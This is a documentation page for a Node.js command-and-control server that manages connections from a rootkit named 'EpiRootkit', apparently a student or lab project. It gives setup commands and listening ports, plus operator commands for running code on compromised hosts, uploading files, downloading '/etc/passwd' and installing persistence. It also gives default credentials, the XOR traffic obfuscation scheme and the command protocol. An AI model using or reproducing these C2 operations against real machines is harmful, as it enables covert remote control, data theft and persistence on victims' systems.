---
title: "Overview"
description: "C2 server architecture and capabilities"
icon: "dashboard"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 301
---

# C2 Server Overview

Professional Command & Control server for managing EpiRootkit connections.

## Quick Start

```bash
cd attacking_program
pnpm install
pnpm start
```

**Ports:**
- C2 Server: `4444`
- Web Interface: `3000`

## Architecture

- **CLI Interface**: Interactive command system
- **C2 Server**: TCP server for rootkit connections
- **Web Interface**: REST API with Socket.IO
- **Client Manager**: Connection lifecycle and authentication
- **Event System**: Real-time logging

### Technology Stack
- **Runtime**: Node.js 18+ with pnpm
- **CLI**: Vorpal.js for commands
- **Web**: Express.js + Socket.IO
- **Encryption**: XOR cipher with 32-byte hardcoded key (simple and reliable)

## Core Features

### Client Management
```bash
ls                          # List connected clients
auth Client-1 password      # Authenticate with client
status Client-1             # Get rootkit status
keepalive Client-1          # Check connection health
```

### Remote Operations
```bash
exec Client-1 whoami                       # Execute commands
upload Client-1 ./file.txt /tmp/file.txt   # Upload files
download Client-1 /etc/passwd ./passwd     # Download files
```

### Configuration
```bash
config Client-1             # Interactive configuration
persist Client-1 install    # Manage persistence
```

## Authentication

### SHA-512 Password System
1. C2 sends plaintext password
2. Rootkit hashes and compares
3. Session established (1-hour timeout)
4. Rate limiting: 5 attempts/60 seconds

**Default Credentials:**
- Password: `password`
- Hash: `b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86`

## Configuration

### Environment Settings
```bash
C2_PORT=4444               # C2 server port
WEB_PORT=3000              # Web interface port
ENCRYPTION_KEY=secret32hex  # 32-character hex key
ENABLE_ENCRYPTION=true     # XOR encryption toggle
PASSWORD_HASH=hash         # SHA-512 password hash
```

## Security Features

- **Authentication**: SHA-512 with brute force protection
- **XOR Encryption**: Simple 32-byte key cipher for reliable traffic obfuscation  
- **Session Management**: Automatic timeout and cleanup
- **Access Control**: Commands require authentication
- **Health Monitoring**: Automatic stale client detection

## Network Protocol

### Command Format
```json
{
  "type": "command",
  "command": "exec",
  "data": "whoami"
}
```

### Response Format
```json
{
  "type": "response", 
  "success": true,
  "data": "root"
}
```